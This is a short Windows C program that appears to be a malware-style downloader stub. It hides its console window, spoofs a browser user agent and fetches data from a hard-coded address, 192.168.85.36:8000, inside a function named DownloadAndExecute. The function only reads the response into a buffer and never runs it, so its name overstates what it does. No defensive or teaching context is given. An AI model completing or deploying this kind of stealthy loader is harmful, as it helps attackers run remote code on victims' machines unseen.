#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

void DownloadAndExecute() {
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL, NULL, 0);

    if (!hInternet) return;

    HINTERNET hFile = InternetOpenUrlA(
        hInternet,
        "http://192.168.85.36:8000/data",
        NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        0);

    if (!hFile) {
        InternetCloseHandle(hInternet);
        return;
    }

    char buffer[4096];
    DWORD bytesRead = 0;
    DWORD totalSize = 0;

    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        totalSize += bytesRead;
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    DownloadAndExecute();
    return 0;
}
